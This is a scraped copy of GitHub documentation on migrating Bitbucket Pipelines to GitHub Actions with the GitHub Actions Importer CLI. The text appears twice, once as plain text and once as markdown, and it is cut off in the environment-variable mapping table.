Actions Importer.\nRunning the audit command\nTo perform an audit run the following command in your terminal, replacing :workspace with the name of the Bitbucket workspace to audit.\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit \nOptionally, a --project-key option can be provided to the audit command to limit the results to only pipelines associated with a project.\nIn the below example command :project_key should be replaced with the key of the project that should be audited. Project keys can be found in Bitbucket on the workspace projects page.\ngh actions-importer audit bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/audit \nInspecting the audit results\nThe files in the specified output directory contain the results of the audit. See the audit_summary.md file for a summary of the audit results.\nThe audit summary has the following sections.\nPipelines\nThe \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer.\nListed below are some key terms that can appear in the \"Pipelines\" section:\nSuccessful pipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.\nPartially successful pipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.\nUnsupported pipelines are definition types that are not supported by GitHub Actions Importer.\nFailed pipelines encountered a fatal error when being converted. This can occur for one of three reasons: \nThe pipeline was originally misconfigured and not valid.\nGitHub Actions Importer encountered an internal error when converting it.\nThere was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.\nBuild steps\nThe \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer.\nListed below are some key terms that can appear in the \"Build steps\" section:\nA known build step is a step that was automatically converted to an equivalent action.\nAn unknown build step is a step that was not automatically converted to an equivalent action.\nAn unsupported build step is a step that is either: \nFundamentally not supported by GitHub Actions.\nConfigured in a way that is incompatible with GitHub Actions.\nAn action is a list of the actions that were used in the converted workflows. This can be important for: \nIf you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.\nDefining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.\nManual tasks\nThe \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually.\nListed below are some key terms that can appear in the \"Manual tasks\" section:\nA secret is a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, see Using secrets in GitHub Actions.\nA self-hosted runner refers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly.\nFiles\nThe final section of the audit report provides a manifest of all the files that were written to disk during the audit.\nEach pipeline file has a variety of files included in the audit, including:\nThe original pipeline as it was defined in GitHub.\nAny network responses used to convert the pipeline.\nThe converted workflow file.\nStack traces that can be used to troubleshoot a failed pipeline conversion.\nAdditionally, the workflow_usage.csv file contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews.\nForecasting usage\nYou can use the forecast command to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Bitbucket instance.\nRunning the forecast command\nTo perform a forecast of potential GitHub Actions usage, run the following command in your terminal, replacing :workspace with the name of the Bitbucket workspace to forecast. By default, GitHub Actions Importer includes the previous seven days in the forecast report.\ngh actions-importer forecast bitbucket --workspace :workspace --output-dir tmp/forecast_reports \nForecasting a project\nTo limit the forecast to a project, you can use the --project-key option. Replace the value for the :project_key with the project key for the project to forecast.\ngh actions-importer forecast bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/forecast_reports \nInspecting the forecast report\nThe forecast_report.md file in the specified output directory contains the results of the forecast.\nListed below are some key terms that can appear in the forecast report:\nThe job count is the total number of completed jobs.\nThe pipeline count is the number of unique pipelines used.\nExecution time describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners. \nThis metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use the GitHub Actions pricing calculator to estimate the costs.\nConcurrent jobs metrics describe the amount of jobs running at any given time.\nPerforming a dry-run migration\nYou can use the dry-run command to convert a Bitbucket pipeline to an equivalent GitHub Actions workflow(s). A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\nRunning the dry-run command\nTo perform a dry run of migrating a Bitbucket pipeline to GitHub Actions, run the following command in your terminal, replacing :workspace with the name of the workspace and :repo with the name of the repository in Bitbucket.\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run \nInspecting the converted workflows\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\nIf there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, see Extending GitHub Actions Importer with custom transformers.\nPerforming a production migration\nYou can use the migrate command to convert a Bitbucket pipeline and open a pull request with the equivalent GitHub Actions workflow(s).\nRunning the migrate command\nTo migrate a Bitbucket pipeline to GitHub Actions, run the following command in your terminal, replacing the following values.\nReplace target-url value with the URL for your GitHub repository.\nReplace :repo with the name of the repository in Bitbucket.\nReplace :workspace with the name of the workspace.\ngh actions-importer migrate bitbucket --workspace :workspace --repository :repo --target-url https://github.com/:owner/:repo --output-dir tmp/dry-run \nThe command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\ngh actions-importer migrate bitbucket --workspace actions-importer --repository custom-trigger --target-url https://github.com/valet-dev-testing/demo-private --output-dir tmp/bitbucket [2023-07-18 09:56:06] Logs: 'tmp/bitbucket/log/valet-20230718-165606.log' [2023-07-18 09:56:24] Pull request: 'https://github.com/valet-dev-testing/demo-private/pull/55' \nInspecting the pull request\nThe output from a successful run of the migrate command contains a link to the new pull request that adds the converted workflow to your repository.\nSome important elements of the pull request include:\nIn the pull request description, a section called Manual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.\nThe converted workflows file. Select the Files changed tab in the pull request to view the workflow file that will be added to your GitHub repository.\nWhen you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository.\nReference\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Bitbucket Pipelines.\nUsing environment variables\nGitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using the configure command. For more information, see the Configuring credentials section.\nGitHub Actions Importer uses the following environment variables to connect to your Bitbucket instance.\nGITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a transformed workflow (requires repo and workflow scopes).\nGITHUB_INSTANCE_URL: The url to the target GitHub instance. (e.g. https://github.com)\nBITBUCKET_ACCESS_TOKEN: The workspace access token with read scopes for pipeline, project, and repository.\nThese environment variables can be specified in a .env.local file that will be loaded by GitHub Actions Importer at run time. The distribution archive contains a .env.local.template file that can be used to create these files.\nOptional arguments\nThere are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration.\n--source-file-path\nYou can use the --source-file-path argument with the dry-run or migrate subcommands.\nBy default, GitHub Actions Importer fetches pipeline contents from the Bitbucket instance. The --source-file-path argument tells GitHub Actions Importer to use the specified source file path instead.\nFor example:\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run --source-file-path path/to/my/pipeline/file.yml \n--config-file-path\nYou can use the --config-file-path argument with the audit, dry-run, and migrate subcommands.\nBy default, GitHub Actions Importer fetches pipeline contents from the Bitbucket instance. The --config-file-path argument tells GitHub Actions Importer to use the specified source files instead.\nAudit example\nIn this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit.\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit --config-file-path \"path/to/my/bitbucket/config.yml\" \nTo audit a Bitbucket instance using a config file, the config file must be in the following format, and each repository_slug must be unique:\nsource_files: - repository_slug: repo_name path: path/to/one/source/file.yml - repository_slug: another_repo_name path: path/to/another/source/file.yml \nSupported syntax for Bitbucket Pipelines\nThe following table shows the type of properties that GitHub Actions Importer is currently able to convert.\nBitbucketGitHub ActionsStatus\nafter-script\tjobs.<job_id>.steps[*]\tSupported\t\nartifacts\tactions/upload-artifact & download-artifact\tSupported\t\ncaches\tactions/cache\tSupported\t\nclone\tactions/checkout\tSupported\t\ncondition\tjob.<job_id>.steps[*].run\tSupported\t\ndeployment\tjobs.<job_id>.environment\tSupported\t\nimage\tjobs.<job_id>.container\tSupported\t\nmax-time\tjobs.<job_id>.steps[*].timeout-minutes\tSupported\t\noptions.docker\tNone\tSupported\t\noptions.max-time\tjobs.<job_id>.steps[*].timeout-minutes\tSupported\t\nparallel\tjobs.<job_id>\tSupported\t\npipelines.branches\ton.push\tSupported\t\npipelines.custom\ton.workflow_dispatch\tSupported\t\npipelines.default\ton.push\tSupported\t\npipelines.pull-requests\ton.pull_requests\tSupported\t\npipelines.tags\ton.tags\tSupported\t\nruns-on\tjobs.<job_id>.runs-on\tSupported\t\nscript\tjob.<job_id>.steps[*].run\tSupported\t\nservices\tjobs.<job_id>.service\tSupported\t\nstage\tjobs.<job_id>\tSupported\t\nstep\tjobs.<job_id>.steps[*]\tSupported\t\ntrigger\ton.workflow_dispatch\tSupported\t\nfail-fast\tNone\tUnsupported\t\noidc\tNone\tUnsupported\t\noptions.size\tNone\tUnsupported\t\nsize\tNone\tUnsupported\t\nEnvironment variable mapping\nGitHub Actions Importer uses the mapping in the table below to convert default Bitbucket environment variables to the closest equivalent in GitHub Actions.\nBitbucketGitHub Actions\nCI\ttrue\t\nBITBUCKET_BUILD_NUMBER\t${{ github.run_number }}\t\nBITBUCKET_CLONE_DIR\t${{ github.workspace }}\t\nBITBUCKET_COMMIT\t${{ github.sha }}\t\nBITBUCKET_WORKSPACE\t${{ github.repository_owner }}\t\nBITBUCKET_REPO_SLUG\t${{ github.repository }}\t\nBITBUCKET_REPO_UUID\t${{ github.repository_id }}\t\nBITBUCKET_REPO_FULL_NAME\t${{ github.repository_owner }}/${{ github.repository }}\t\nBITBUCKET_BRANCH\t${{ github.ref }}\t\nBITBUCKET_TAG\t${{ github.ref }}\t\nBITBUCKET_PR_ID\t${{ github.event.pull_request.number }}\t\nBITBUCKET_PR_DESTINATION_BRANCH\t${{ github.event.pull_request.base.ref }}\t\nBITBUCKET_GIT_HTTP_ORIGIN\t${{ github.event.repository.clone_url }}\t\nBITBUCKET_GIT_SSH_ORIGIN\t${{ github.event.repository.ssh_url }}\t\nBITBUCKET_EXIT_CODE\t${{ job.status }}\t\nBITBUCKET_STEP_UUID\t${{ job.github_job }}\t\nBITBUCKET_PIPELINE_UUID\t${{ github.workflow }}\t\nBITBUCKET_PROJECT_KEY\t${{ github.repository_owner }}\t\nBITBUCKET_PROJECT_UUID\t${{ github.repository_owner }}\t\nBITBUCKET_STEP_TRIGGERER_UUID\t${{ github.actor_id }}\t\nBITBUCKET_SSH_KEY_FILE\t${{ github.workspace }}/.ssh/id_rsa\t\nBITBUCKET_STEP_OIDC_TOKEN\tNo Mapping\t\nBITBUCKET_DEPLOYMENT_ENVIRONMENT\tNo Mapping\t\nBITBUCKET_DEPLOYMENT_ENVIRONMENT_UUID\tNo Mapping\t\nBITBUCKET_BOOKMARK\tNo Mapping\t\nBITBUCKET_PARALLEL_STEP\tNo Mapping\t\nBITBUCKET_PARALLEL_STEP_COUNT\tNo Mapping\t\nSystem Variables\nSystem variables used in tasks are transformed to the equivalent bash shell variable and are assumed to be available. For example, ${system.<variable.name>} will be transformed to $variable_name. We recommend you verify this to ensure proper operation of the workflow.\nLegal notice\nPortions have been adapted from https://github.com/github/gh-actions-importer/ under the MIT license:\nMIT License Copyright (c) 2022 GitHub Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-bitbucket-pipelines-v8mmvk.html",
  "markdown": "# Migrating from Bitbucket Pipelines with GitHub Actions Importer\n\nLearn how to use GitHub Actions Importer to automate the migration of your Bitbucket pipelines to GitHub Actions.\n\n[Legal notice](#legal-notice)\n\n## [About migrating from Bitbucket Pipelines with GitHub Actions Importer](#about-migrating-from-bitbucket-pipelines-with-github-actions-importer)\n\nThe instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Bitbucket Pipelines to GitHub Actions.\n\n### [Prerequisites](#prerequisites)\n\n*   An environment where you can run Linux-based containers, and can install the necessary tools.\n    \n    *   Docker is [installed](https://docs.docker.com/get-docker/) and running.\n        \n    *   [GitHub CLI](https://cli.github.com/) is installed.\n        \n    \n    Note\n    \n    The GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.\n    \n\n### [Limitations](#limitations)\n\nThere are some limitations when migrating from Bitbucket Pipelines to GitHub Actions with GitHub Actions Importer.\n\n*   Images in a private AWS ECR are not supported.\n    \n*   The Bitbucket Pipelines option `size` is not supported. If additional runner resources are required in GitHub Actions, consider using larger runners. For more information, see [Using larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-larger-runners).\n    \n*   Metrics detailing the queue time of jobs is not supported by the `forecast` command.\n    \n*   Bitbucket [after-scripts](https://support.atlassian.com/bitbucket-cloud/docs/step-options/#After-script) are supported using GitHub Actions `always()` in combination with checking the `steps.<step_id>.conclusion` of the previous step. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context).\n    \n    The following is an example of using the `always()` with `steps.<step_id>.conclusion`.\n    \n    ```\n      - name: After Script 1\n        run: |-\n          echo \"I'm after the script ran!\"\n          echo \"We should be grouped!\"\n        id: after-script-1\n        if: \"${{ always() }}\"\n      - name: After Script 2\n        run: |-\n          echo \"this is really the end\"\n          echo \"goodbye, for now!\"\n        id: after-script-2\n        if: \"${{ steps.after-script-1.conclusion == 'success' && always() }}\"\n    ```\n    \n\n### [Manual tasks](#manual-tasks)\n\nCertain Bitbucket Pipelines constructs must be migrated manually. These include:\n\n*   Secured repository, workspace, and deployment variables\n*   SSH keys\n\n## [Installing the GitHub Actions Importer CLI extension](#installing-the-github-actions-importer-cli-extension)\n\n1.  Install the GitHub Actions Importer CLI extension:\n    \n    Bash\n    \n    ```\n    gh extension install github/gh-actions-importer\n    ```\n    \n2.  Verify that the extension is installed:\n    \n    ```\n    $ gh actions-importer -h\n    Options:\n      -?, -h, --help  Show help and usage information\n    \n    Commands:\n      update     Update to the latest version of GitHub Actions Importer.\n      version    Display the version of GitHub Actions Importer.\n      configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n      audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n      forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n      dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n      migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n    ```\n    \n\n## [Configuring credentials](#configuring-credentials)\n\nThe `configure` CLI command is used to set required credentials and options for GitHub Actions Importer when working with Bitbucket Pipelines and GitHub.\n\n1.  Create a GitHub personal access token (classic). For more information, see [Managing your personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#creating-a-personal-access-token-classic).\n    \n    Your token must have the `workflow` scope.\n    \n    After creating the token, copy it and save it in a safe location for later use.\n    \n2.  Create a Workspace Access Token for Bitbucket Pipelines. For more information, see [Workspace Access Token permissions](https://support.atlassian.com/bitbucket-cloud/docs/workspace-access-token-permissions/) in the Bitbucket documentation. Your token must have the `read` scope for pipelines, projects, and repositories.\n    \n3.  In your terminal, run the GitHub Actions Importer `configure` CLI command:\n    \n    ```\n    gh actions-importer configure\n    ```\n    \n    The `configure` command will prompt you for the following information:\n    \n    *   For \"Which CI providers are you configuring?\", use the arrow keys to select `Bitbucket`, press Space to select it, then press Enter.\n    *   For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and press Enter.\n    *   For \"Base url of the GitHub instance\", press Enter to accept the default value (`https://github.com`).\n    *   For \"Personal access token for Bitbucket\", enter the Workspace Access Token that you created earlier, and press Enter.\n    *   For \"Base url of the Bitbucket instance\", enter the URL for your Bitbucket instance, and press Enter.\n    \n    An example of the `configure` command is shown below:\n    \n    ```\n    $ gh actions-importer configure\n    ✔ Which CI providers are you configuring?: Bitbucket\n    Enter the following values (leave empty to omit):\n    ✔ Personal access token for GitHub: ***************\n    ✔ Base url of the GitHub instance: https://github.com\n    ✔ Personal access token for Bitbucket: ********************\n    ✔ Base url of the Bitbucket instance: https://bitbucket.example.com\n    Environment variables successfully updated.\n    ```\n    \n4.  In your terminal, run the GitHub Actions Importer `update` CLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:\n    \n    ```\n    gh actions-importer update\n    ```\n    \n    The output of the command should be similar to below:\n    \n    ```\n    Updating ghcr.io/actions-importer/cli:latest...\n    ghcr.io/actions-importer/cli:latest up-to-date\n    ```\n    \n\n## [Perform an audit of the Bitbucket instance](#perform-an-audit-of-the-bitbucket-instance)\n\nYou can use the audit command to get a high-level view of pipelines in a Bitbucket instance.\n\nThe audit command performs the following steps.\n\n1.  Fetches all of the pipelines for a workspace.\n2.  Converts pipeline to its equivalent GitHub Actions workflow.\n3.  Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer.\n\n### [Running the audit command](#running-the-audit-command)\n\nTo perform an audit run the following command in your terminal, replacing `:workspace` with the name of the Bitbucket workspace to audit.\n\n```\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit\n```\n\nOptionally, a `--project-key` option can be provided to the audit command to limit the results to only pipelines associated with a project.\n\nIn the below example command `:project_key` should be replaced with the key of the project that should be audited. Project keys can be found in Bitbucket on the workspace projects page.\n\n```\ngh actions-importer audit bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/audit\n```\n\n### [Inspecting the audit results](#inspecting-the-audit-results)\n\nThe files in the specified output directory contain the results of the audit. See the `audit_summary.md` file for a summary of the audit results.\n\nThe audit summary has the following sections.\n\n#### [Pipelines](#pipelines)\n\nThe \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer.\n\nListed below are some key terms that can appear in the \"Pipelines\" section:\n\n*   **Successful** pipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.\n*   **Partially successful** pipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.\n*   **Unsupported** pipelines are definition types that are not supported by GitHub Actions Importer.\n*   **Failed** pipelines encountered a fatal error when being converted. This can occur for one of three reasons:\n    *   The pipeline was originally misconfigured and not valid.\n    *   GitHub Actions Importer encountered an internal error when converting it.\n    *   There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.\n\n#### [Build steps](#build-steps)\n\nThe \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer.\n\nListed below are some key terms that can appear in the \"Build steps\" section:\n\n*   A **known** build step is a step that was automatically converted to an equivalent action.\n*   An **unknown** build step is a step that was not automatically converted to an equivalent action.\n*   An **unsupported** build step is a step that is either:\n    *   Fundamentally not supported by GitHub Actions.\n    *   Configured in a way that is incompatible with GitHub Actions.\n*   An **action** is a list of the actions that were used in the converted workflows. This can be important for:\n    *   If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.\n    *   Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.\n\n#### [Manual tasks](#manual-tasks-1)\n\nThe \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually.\n\nListed below are some key terms that can appear in the \"Manual tasks\" section:\n\n*   A **secret** is a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions).\n*   A **self-hosted runner** refers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly.\n\n#### [Files](#files)\n\nThe final section of the audit report provides a manifest of all the files that were written to disk during the audit.\n\nEach pipeline file has a variety of files included in the audit, including:\n\n*   The original pipeline as it was defined in GitHub.\n*   Any network responses used to convert the pipeline.\n*   The converted workflow file.\n*   Stack traces that can be used to troubleshoot a failed pipeline conversion.\n\nAdditionally, the `workflow_usage.csv` file contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews.\n\n## [Forecasting usage](#forecasting-usage)\n\nYou can use the `forecast` command to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Bitbucket instance.\n\n### [Running the forecast command](#running-the-forecast-command)\n\nTo perform a forecast of potential GitHub Actions usage, run the following command in your terminal, replacing `:workspace` with the name of the Bitbucket workspace to forecast. By default, GitHub Actions Importer includes the previous seven days in the forecast report.\n\n```\ngh actions-importer forecast bitbucket --workspace :workspace --output-dir tmp/forecast_reports\n```\n\n### [Forecasting a project](#forecasting-a-project)\n\nTo limit the forecast to a project, you can use the `--project-key` option. Replace the value for the `:project_key` with the project key for the project to forecast.\n\n```\ngh actions-importer forecast bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/forecast_reports\n```\n\n### [Inspecting the forecast report](#inspecting-the-forecast-report)\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n*   The **job count** is the total number of completed jobs.\n*   The **pipeline count** is the number of unique pipelines used.\n*   **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.\n    *   This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use the [GitHub Actions pricing calculator](https://github.com/pricing/calculator) to estimate the costs.\n*   **Concurrent jobs** metrics describe the amount of jobs running at any given time.\n\n## [Performing a dry-run migration](#performing-a-dry-run-migration)\n\nYou can use the dry-run command to convert a Bitbucket pipeline to an equivalent GitHub Actions workflow(s). A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\n### [Running the dry-run command](#running-the-dry-run-command)\n\nTo perform a dry run of migrating a Bitbucket pipeline to GitHub Actions, run the following command in your terminal, replacing `:workspace` with the name of the workspace and `:repo` with the name of the repository in Bitbucket.\n\n```\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run\n```\n\n### [Inspecting the converted workflows](#inspecting-the-converted-workflows)\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\nIf there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, see [Extending GitHub Actions Importer with custom transformers](https://docs.github.com/en/actions/migrating-to-github-actions/automated-migrations/extending-github-actions-importer-with-custom-transformers).\n\n## [Performing a production migration](#performing-a-production-migration)\n\nYou can use the migrate command to convert a Bitbucket pipeline and open a pull request with the equivalent GitHub Actions workflow(s).\n\n### [Running the migrate command](#running-the-migrate-command)\n\nTo migrate a Bitbucket pipeline to GitHub Actions, run the following command in your terminal, replacing the following values.\n\n*   Replace `target-url` value with the URL for your GitHub repository.\n*   Replace `:repo` with the name of the repository in Bitbucket.\n*   Replace `:workspace` with the name of the workspace.\n\n```\ngh actions-importer migrate bitbucket --workspace :workspace --repository :repo --target-url https://github.com/:owner/:repo --output-dir tmp/dry-run\n```\n\nThe command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```\ngh actions-importer migrate bitbucket --workspace actions-importer --repository custom-trigger --target-url https://github.com/valet-dev-testing/demo-private --output-dir tmp/bitbucket\n[2023-07-18 09:56:06] Logs: 'tmp/bitbucket/log/valet-20230718-165606.log'\n[2023-07-18 09:56:24] Pull request: 'https://github.com/valet-dev-testing/demo-private/pull/55'\n```\n\n### [Inspecting the pull request](#inspecting-the-pull-request)\n\nThe output from a successful run of the `migrate` command contains a link to the new pull request that adds the converted workflow to your repository.\n\nSome important elements of the pull request include:\n\n*   In the pull request description, a section called **Manual steps**, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.\n*   The converted workflows file. Select the **Files changed** tab in the pull request to view the workflow file that will be added to your GitHub repository.\n\nWhen you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository.\n\n## [Reference](#reference)\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Bitbucket Pipelines.\n\n### [Using environment variables](#using-environment-variables)\n\nGitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using the `configure` command. For more information, see the [Configuring credentials](#configuring-credentials) section.\n\nGitHub Actions Importer uses the following environment variables to connect to your Bitbucket instance.\n\n*   `GITHUB_ACCESS_TOKEN`: The personal access token (classic) used to create pull requests with a transformed workflow (requires `repo` and `workflow` scopes).\n*   `GITHUB_INSTANCE_URL`: The url to the target GitHub instance. (e.g. `https://github.com`)\n*   `BITBUCKET_ACCESS_TOKEN`: The workspace access token with read scopes for pipeline, project, and repository.\n\nThese environment variables can be specified in a `.env.local` file that will be loaded by GitHub Actions Importer at run time. The distribution archive contains a `.env.local.template` file that can be used to create these files.\n\n### [Optional arguments](#optional-arguments)\n\nThere are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration.\n\n#### [`--source-file-path`](#--source-file-path)\n\nYou can use the `--source-file-path` argument with the `dry-run` or `migrate` subcommands.\n\nBy default, GitHub Actions Importer fetches pipeline contents from the Bitbucket instance. The `--source-file-path` argument tells GitHub Actions Importer to use the specified source file path instead.\n\nFor example:\n\n```\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run --source-file-path path/to/my/pipeline/file.yml\n```\n\n#### [`--config-file-path`](#--config-file-path)\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, GitHub Actions Importer fetches pipeline contents from the Bitbucket instance. The `--config-file-path` argument tells GitHub Actions Importer to use the specified source files instead.\n\n### [Audit example](#audit-example)\n\nIn this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit.\n\n```\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit --config-file-path \"path/to/my/bitbucket/config.yml\"\n```\n\nTo audit a Bitbucket instance using a config file, the config file must be in the following format, and each `repository_slug` must be unique:\n\n```\nsource_files:\n  - repository_slug: repo_name\n    path: path/to/one/source/file.yml\n  - repository_slug: another_repo_name\n    path: path/to/another/source/file.yml\n```\n\n## [Supported syntax for Bitbucket Pipelines](#supported-syntax-for-bitbucket-pipelines)\n\nThe following table shows the type of properties that GitHub Actions Importer is currently able to convert.\n\n| Bitbucket | GitHub Actions | Status |\n| --- | --- | --- |\n| `after-script` | `jobs.<job_id>.steps[*]` | Supported |\n| `artifacts` | `actions/upload-artifact` & `download-artifact` | Supported |\n| `caches` | `actions/cache` | Supported |\n| `clone` | `actions/checkout` | Supported |\n| `condition` | `job.<job_id>.steps[*].run` | Supported |\n| `deployment` | `jobs.<job_id>.environment` | Supported |\n| `image` | `jobs.<job_id>.container` | Supported |\n| `max-time` | `jobs.<job_id>.steps[*].timeout-minutes` | Supported |\n| `options.docker` | None | Supported |\n| `options.max-time` | `jobs.<job_id>.steps[*].timeout-minutes` | Supported |\n| `parallel` | `jobs.<job_id>` | Supported |\n| `pipelines.branches` | `on.push` | Supported |\n| `pipelines.custom` | `on.workflow_dispatch` | Supported |\n| `pipelines.default` | `on.push` | Supported |\n| `pipelines.pull-requests` | `on.pull_requests` | Supported |\n| `pipelines.tags` | `on.tags` | Supported |\n| `runs-on` | `jobs.<job_id>.runs-on` | Supported |\n| `script` | `job.<job_id>.steps[*].run` | Supported |\n| `services` | `jobs.<job_id>.service` | Supported |\n| `stage` | `jobs.<job_id>` | Supported |\n| `step` | `jobs.<job_id>.steps[*]` | Supported |\n| `trigger` | `on.workflow_dispatch` | Supported |\n| `fail-fast` | None | Unsupported |\n| `oidc` | None | Unsupported |\n| `options.size` | None | Unsupported |\n| `size` | None | Unsupported |\n\n### [Environment variable mapping](#environment-variable-mapping)\n\nGitHub Actions Importer uses the mapping in the table below to convert default Bitbucket environment variables to the closest equivalent in GitHub Actions.\n\n| Bitbucket | GitHub Actions |\n| --- | --- |\n| `CI` | `true` |\n| `BITBUCKET_BUILD_NUMBER` | `${{ github.run_number }}` |\n| `BITBUCKET_CLONE_DIR` | `${{ github.workspace }}` |\n| `BITBUCKET_COMMIT` | `${{ github.sha }}` |\n| `BITBUCKET_WORKSPACE` | `${{ github.repository_owner }}` |\n| `BITBUCKET_REPO_SLUG` | `${{ github.repository }}` |\n| `BITBUCKET_REPO_UUID` | `${{ github.repository_id }}` |\n| `BITBUCKET_REPO_FULL_NAME` | `${{ github.repository_owner }}`/`${{ github.repository }}` |\n| `BITBUCKET_BRANCH` | `${{ github.ref }}` |\n| `BITBUCKET_TAG` | `${{ github.ref }}` |\n| `BITBUCKET_PR_ID` | `${{ 